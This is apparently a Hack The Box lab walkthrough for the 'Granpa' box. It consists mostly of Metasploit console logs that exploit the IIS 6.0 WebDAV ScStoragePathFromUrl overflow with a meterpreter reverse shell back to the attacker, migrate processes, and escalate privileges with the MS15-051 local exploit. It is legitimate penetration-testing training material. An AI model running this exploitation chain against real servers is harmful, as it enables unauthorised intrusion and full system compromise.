# Granpa

## where you at

10.10.10.14 

## what you got

IIS 6.0 + Webdav

https://www.exploit-db.com/exploits/41738

```
msf5 > search ScStoragePathFromUrl
                                                    
Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes     Microsoft IIS WebDav ScStoragePathFromUrl Overflow


msf5 > use 0
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LPORT 4444
LPORT => 4444
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LHOST tun0
LHOST => tun0
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOST 10.10.10.14
RHOST => 10.10.10.14
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS         10.10.10.14      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86

msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.14.24:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (180291 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.24:4444 -> 10.10.10.14:1033) at 2020-01-25 14:17:32 +0100

meterpreter > sysinfo
Computer        : GRANPA
OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows

meterpreter > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 3428 created.
Channel 2 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service

C:\>systeminfo
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 13 Hours, 8 Minutes, 37 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~1999 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 793 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,323 MB
Page File: In Use:         147 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A

```

```
root@kali:/mnt/hgfs/_shared_folder/htb/boxes/Grandpa/scans# /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py -i systeminfo.txt -d /opt/Windows-Exploit-Suggester/2020-01-24-mssb.xls >> wes.txt
```

```
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > search ms15-051

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  exploit/windows/local/ms15_051_client_copy_image  2015-05-12       normal  Yes    Windows ClientCopyImage Win32k Exploit

[*] Started reverse TCP handler on 192.168.136.165:4444 
[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.
[*] Exploit completed, but no session was created.
```
```
meterpreter > ps                                                                                                                                                                                                 
                                                                                                                                                                                                                 
Process List                                                                                                                                                                                                     
============                                                                                                                                                                                                     
                                                                                                                                                                                                                 
 PID   PPID  Name               Arch  Session  User                          Path                                                                                                                                
 ---   ----  ----               ----  -------  ----                          ----                                                                                                                                
 0     0     [System Process]                                                                                                                                                                                    
 4     0     System                                                                                                                                                                                              
 272   4     smss.exe                                                                                                                                                                                            
 324   272   csrss.exe                                                                                                                                                                                           
 348   272   winlogon.exe                                                                                                                                                                                        
 396   348   services.exe                                                                                                                                                                                        
 408   348   lsass.exe                                                                                                                                                                                           
 588   396   svchost.exe                                                                                                                                                                                         
 680   396   svchost.exe                                                                                                                                                                                         
 736   396   svchost.exe                                                                                                                                                                                         
 764   396   svchost.exe                                                                                                                                                                                         
 800   396   svchost.exe                                                                                                                                                                                         
 936   396   spoolsv.exe                                                                                                                                                                                         
 964   396   msdtc.exe                                                                                                                                                                                           
 1076  396   cisvc.exe                                                                                                                                                                                           
 1116  396   svchost.exe                                                                                                                                                                                         
 1176  396   inetinfo.exe                                                                                                                                                                                        
 1216  396   svchost.exe                                                                                                                                                                                         
 1328  396   VGAuthService.exe                                                                                                                                                                                   
 1408  396   vmtoolsd.exe                                                                                                                                                                                        
 1456  396   svchost.exe                                                                                                                                                                                         
 1596  396   svchost.exe                                                                                                                                                                                         
 1708  396   alg.exe                                                          
 1836  588   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1912  396   dllhost.exe                                                      
 2300  588   wmiprvse.exe                                                     
 3048  1456  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3120  588   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 3168  3048  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 3220  800   wmiadap.exe                                                      

meterpreter > migrate 1836
[*] Migrating from 3168 to 1836...
[*] Migration completed successfully.

```

```
msf5 exploit(windows/local/ms15_051_client_copy_image) > run

[*] Started reverse TCP handler on 10.10.14.24:4445 
[*] Launching notepad to host the exploit...
[+] Process 3856 launched.
[*] Reflectively injecting the exploit DLL into 3856...
[*] Injecting exploit into 3856...
[*] Exploit injected. Injecting payload into 3856...
[*] Payload injected. Executing exploit...
[*] Sending stage (180291 bytes) to 10.10.10.14
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 3 opened (10.10.14.24:4445 -> 10.10.10.14:1032) at 2020-01-25 14:49:47 +0100

meterpreter > 

```